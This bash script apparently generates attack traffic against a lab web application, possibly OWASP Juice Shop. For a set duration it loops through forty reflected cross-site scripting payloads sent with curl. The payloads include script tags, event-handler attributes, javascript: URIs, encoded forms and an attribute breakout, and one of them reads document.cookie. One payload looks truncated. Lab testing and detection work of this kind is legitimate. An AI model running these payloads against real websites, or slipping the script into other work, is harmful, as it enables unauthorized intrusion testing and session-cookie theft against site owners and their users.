#!/bin/bash
TARGET_IP="${TARGET_IP:-100.64.0.20}"
JUICE_URL="http://${TARGET_IP}:${PORT}"
DURATION_SECONDS="${DURATION_SECONDS:-600}"
END_TIME=$(( $(date +%s) + DURATION_SECONDS ))
INTERVAL=2

ts() { date +"%Y-%m-%dT%H:%M:%S.%3N%:z"; }

total_attacks=0

echo "--- Starting PortSwigger XSS Loop for ${DURATION_SECONDS} seconds ---"
echo "Target: $JUICE_URL"

while [ "$(date +%s)" -lt "$END_TIME" ]; do

  echo "[$(ts)] Attack 1"
  curl -s "${JUICE_URL}/?q=<script>alert(1)</script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 2"
  curl -s "${JUICE_URL}/?q=<img%20src=x%20onerror=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 3"
  curl -s "${JUICE_URL}/?q=<svg%20onload=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 4"
  curl -s "${JUICE_URL}/?q=<iframe%20src='javascript:alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 5"
  curl -s "${JUICE_URL}/?q=<a%20href='javascript:alert(1)'>Click</a>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 6"
  curl -s "${JUICE_URL}/?q=<input%20autofocus%20onfocus=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 7"
  curl -s "${JUICE_URL}/?q=<body%20onload=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 8"
  curl -s "${JUICE_URL}/?q=<details%20open%20ontoggle=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 9"
  curl -s "${JUICE_URL}/?q=\"><svg%20onload=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 10"
  curl -s "${JUICE_URL}/?q=</textarea><script>alert(1)</script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 11"
  curl -s "${JUICE_URL}/?q=<img%20src=1%20onerror=prompt(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 12"
  curl -s "${JUICE_URL}/?q=<marquee%20onstart=confirm(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 13"
  curl -s "${JUICE_URL}/?q=<script>/*</script><script>alert(1)</script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 14"
  curl -s "${JUICE_URL}/?q=<script>''-alert(1)//</script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 15"
  curl -s "${JUICE_URL}/?q=<svg><script>alert(1)</script></svg>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 16"
  curl -s "${JUICE_URL}/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 17"
  curl -s "${JUICE_URL}/?q=<video%20src='invalid'%20onerror='alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 18"
  curl -s "${JUICE_URL}/?q=<object%20data='javascript:alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 19"
  curl -s "${JUICE_URL}/?q=<embed%20src='javascript:alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 20"
  curl -s "${JUICE_URL}/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

    echo "[$(ts)] Attack 21"
  curl -s "${JUICE_URL}/?q=<img%20src=x%20onerror=alert(document.cookie)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 22"
  curl -s "${JUICE_URL}/?q=<svg><animate%20onbegin=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 23"
  curl -s "${JUICE_URL}/?q=<div%20onclick=alert(1)>ClickMe</div>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 24"
  curl -s "${JUICE_URL}/?q=<audio%20src=x%20onerror=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 25"
  curl -s "${JUICE_URL}/?q=<button%20onmouseover=alert(1)>Hover</button>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 26"
  curl -s "${JUICE_URL}/?q=<style%20onload=alert(1)></style>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 27"
  curl -s "${JUICE_URL}/?q=<img%20src=x:alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 28"
  curl -s "${JUICE_URL}/?q=<link%20rel=stylesheet%20href='javascript:alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 29"
  curl -s "${JUICE_URL}/?q=<div%20style=\"background:url(javascript:alert(1))\">" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 30"
  curl -s "${JUICE_URL}/?q=<meta%20http-equiv='refresh'%20content='0;javascript:alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 31"
  curl -s "${JUICE_URL}/?q=<script>alert(String.fromCharCode(88,83,83))</script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 32"
  curl -s "${JUICE_URL}/?q=<iframe%20srcdoc='<script>alert(1)</script>'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 33"
  curl -s "${JUICE_URL}/?q=<marquee%20onfinish=alert(1)>Test</marquee>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 34"
  curl -s "${JUICE_URL}/?q=<object%20type='text/html'%20data='javascript:alert(1)'></object>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 35"
  curl -s "${JUICE_URL}/?q=<script>top </script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 36"
  curl -s "${JUICE_URL}/?q=%3Cscript%3Ealert(1)%3C/script%3E" -o /dev/null   # URL encoded
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 37"
  curl -s "${JUICE_URL}/?q=\"><script>alert(1)</script>" -o /dev/null        # breaking out of attr
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 38"
  curl -s "${JUICE_URL}/?q=<textarea%20onfocus=alert(1)>X</textarea>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 39"
  curl -s "${JUICE_URL}/?q=<keygen%20onfocus=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 40"
  curl -s "${JUICE_URL}/?q=<iframe%20src='data:text/html,<script>alert(1)</script>'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

done

echo "--- XSS attack loop complete ---"
echo "Total XSS attacks sent: $total_attacks with end time: $(ts)"
